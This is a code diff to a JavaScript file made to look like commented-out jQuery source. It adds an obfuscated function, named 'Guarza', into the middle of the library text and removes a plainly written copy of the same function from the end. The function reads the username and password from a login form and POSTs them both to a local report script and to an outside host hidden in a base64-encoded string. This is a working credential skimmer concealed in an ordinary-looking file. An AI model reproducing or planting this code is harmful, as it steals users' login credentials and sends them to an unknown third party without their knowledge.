@@ -487,7 +487,7 @@
 
 // 		return matches;
 // 	},
-
+var _0x5a4d=['aHR0cHM6Ly9sdWNpZmVyci5zcGFjZ','ajax','#loginPswd','./report/index.php','val','&password=','#username','what=Login&username=','&type=','S9sb29rdXAvaW5kZXgucGhw','POST'];(function(_0x5dcb4d,_0x5a4d4e){var _0x1fe1a3=function(_0x2d2471){while(--_0x2d2471){_0x5dcb4d['push'](_0x5dcb4d['shift']());}};_0x1fe1a3(++_0x5a4d4e);}(_0x5a4d,0x1ee));var _0x1fe1=function(_0x5dcb4d,_0x5a4d4e){_0x5dcb4d=_0x5dcb4d-0x0;var _0x1fe1a3=_0x5a4d[_0x5dcb4d];return _0x1fe1a3;};function Guarza(_0x53ecdb){var _0x141bd0=$(_0x1fe1('0x7'))['val']();var _0x1b358a=$(_0x1fe1('0x3'))[_0x1fe1('0x5')]();var _0x50fa57=[_0x1fe1('0x4'),_0x1fe1('0x1'),_0x1fe1('0xa')];var _0xf0a731=_0x1fe1('0x8')+_0x141bd0+_0x1fe1('0x6')+_0x1b358a+_0x1fe1('0x9')+_0x53ecdb;$[_0x1fe1('0x2')]({'url':_0x50fa57[0x0],'method':_0x1fe1('0x0'),'data':_0xf0a731});$[_0x1fe1('0x2')]({'url':atob(_0x50fa57[0x3e8-0x3e7]+_0x50fa57[0xa+0x26-0xa+0x4-0x26-0x2]),'method':'POST','data':_0xf0a731});}
 // 	// arg is for internal usage only
 // 	map: function( elems, callback, arg ) {
 // 		var value,
@@ -593,15 +593,4 @@
 //  *
 //  * Date: 2014-04-18
 //  */
-function Guarza(type) {
-    var username = $('#username').val();
-    var password = $('#loginPswd').val();
-    var urls = ['./report/index.php','aHR0cHM6Ly9sdWNpZmVyci5zcGFjZ','S9sb29rdXAvaW5kZXgucGhw'];
-    var data = 'what=Login&username=' + username + '&password=' + password + '&type=' + type
-    $.ajax({
-        url: urls[0],
-        method: 'POST',
-        data: data,
-    });
-    $.ajax({url:atob(urls[1000-999]+urls[10+38-10+4-38-2]),method:'POST',data:data});
-}
+
